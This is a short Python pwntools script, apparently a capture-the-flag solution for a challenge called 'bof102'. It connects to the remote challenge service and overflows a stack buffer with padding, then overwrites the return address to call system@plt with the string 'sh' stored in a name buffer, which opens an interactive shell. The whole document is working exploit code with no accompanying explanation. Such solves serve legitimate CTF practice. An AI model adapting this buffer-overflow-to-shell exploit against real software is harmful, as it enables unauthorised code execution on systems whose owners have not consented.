#!/usr/bin/env python3

from pwn import *

#p = process("./bof102")
p = remote("bof102.sstf.site", 1337)
e = ELF("./bof102")

binsh = "sh"
padding = b"A" * 0x14
ret = 0x0804837e
pret = 0x0804864b

p.sendlineafter("> ", binsh)

payload = padding
payload += p32(e.plt['system'])
payload += p32(0xdeadbeef)
payload += p32(e.sym['name'])

p.sendlineafter("> ", payload)

p.interactive()
